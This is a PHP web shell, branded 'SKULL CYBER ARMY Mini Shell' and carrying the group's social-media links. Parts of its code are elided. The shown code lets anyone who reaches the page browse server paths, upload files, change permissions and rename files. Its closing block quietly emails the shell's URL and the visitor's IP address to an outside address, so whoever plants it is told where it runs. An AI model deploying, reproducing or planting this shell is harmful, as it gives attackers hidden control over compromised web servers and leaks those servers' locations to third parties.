...
////////////////////////////////////////////////////////////////////////
//		SKULL CYBER ARMY
//		BLOG:https://skull-cyber-army.blogspot.com/   
//  	Version    	: V.2									   
//  	GITHUB     	:https://github.com/skullcyberarmy-art 				   
//  	FANS PAGE   :https://www.facebook.com/SKULL-CYBER-ARMY-104240838406745/
//		INSTAGRAM   :https://www.instagram.com/skullcyberarmy/									   
////////////////////////////////////////////////////////////////////////
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>SKULL CYBER ARMY</title>
<style>
body{
	font-family: "Racing Sans One", cursive;
	background-image: url("https://i.ibb.co/TTC2ycL/20210626-095932.jpg");
	color:White;
...
<body>
<h1><center><font color="Red">SKULL CYBER ARMY Mini Shell</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
echo "Disable Functions: $liatds";
echo '<br><font color="Green">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
echo '<font color="Green">Upload Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="Green">File Upload :</font> <input type="file" name="file" />
...
echo '<font color="Green">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
...
echo '<font color="Blue">Ganti Nama Gagal</font><br />';
}
...
echo '<center><br/><font color="Red">SKULL CYBER ARMY Mini Shell</font><br>';
...
?>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'skullcyberarmyart@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>
